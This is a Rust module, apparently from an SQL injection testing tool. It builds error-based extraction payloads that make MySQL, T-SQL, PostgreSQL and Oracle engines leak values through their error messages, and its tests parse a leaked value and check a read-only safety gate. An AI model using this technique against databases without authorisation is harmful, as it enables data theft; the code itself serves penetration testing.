//! Error-based extraction: coerce the engine into repeating the target value
//! inside its own error text.
//!
//! The value is wrapped in the leak markers via the dialect's own error
//! primitive (`EXTRACTVALUE`/`UPDATEXML` on MySQL, `CONVERT`/`CAST` on T-SQL,
//! the NUMERIC cast on PostgreSQL, `CTXSYS.DRITHSX.SN` on Oracle, …), so the
//! same marker slice used for UNION recovers it. One request per value; long
//! values that overflow the engine's error-truncation limit are left to the
//! UNION or blind channels rather than reported partially.

use crate::detection::DbmsFamily;
use crate::dialects::profile;
use crate::payload::boundary::Boundary;
use crate::payload::vectors::{
    primitives_for, render_primitive, VectorChannel, VectorContext,
};

pub use super::union::slice_marked_value as parse_error_value;

/// Build the injected parameter value for an error-based leak of `expr`.
///
/// Reuses the engine's marker-bearing, `AND`-appended error primitives so the
/// payload matches the catalogue exactly; returns `None` when the engine has no
/// such primitive (extraction then falls through to the next channel).
pub fn build_error_payload(dbms: DbmsFamily, boundary: &Boundary, expr: &str) -> Option<String> {
    let p = profile(dbms);
    let ctx = VectorContext {
        query: expr.to_string(),
        seconds: 0,
        columns: 1,
        host: String::new(),
        truth: true,
    };
    // Prefer an appended `AND …` primitive that carries the leak markers ({L}
    // or {W}); these echo the wrapped value cleanly and splice under any
    // boundary. Parameter-replacement primitives are skipped here.
    let prim = primitives_for(dbms, VectorChannel::ErrorExtraction)
        .into_iter()
        .find(|prim| {
            prim.template.starts_with("AND ")
                && (prim.template.contains("{L}") || prim.template.contains("{W}"))
        })?;
    let rendered = render_primitive(&p, prim, &ctx).sql;
    Some(boundary.render(&format!(" {rendered}")))
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn parses_value_from_conversion_error() {
        // MSSQL-style: the value is quoted inside the error, marker-wrapped.
        let body = "Conversion failed when converting the varchar value \
                    'qpvzqmaster.dboqkxbq' to data type int.";
        assert_eq!(parse_error_value(body).as_deref(), Some("master.dbo"));
    }

    #[test]
    fn mysql_error_payload_is_marker_wrapped_and_read_only() {
        let payload = build_error_payload(DbmsFamily::MySQL, &Boundary::single_quoted(), "database()")
            .expect("MySQL has error primitives");
        assert!(payload.contains("qpvzq"), "no leak marker: {payload}");
        assert!(payload.contains("database()"), "expr missing: {payload}");
        assert!(
            matches!(
                crate::safety::is_extraction_read_only(&payload),
                crate::safety::SafetyVerdict::Permitted
            ),
            "error payload failed the read-only gate: {payload}"
        );
    }

    #[test]
    fn postgres_and_oracle_have_error_payloads() {
        assert!(build_error_payload(DbmsFamily::PostgreSQL, &Boundary::numeric(), "version()").is_some());
        assert!(build_error_payload(DbmsFamily::Oracle, &Boundary::numeric(), "USER").is_some());
    }
}
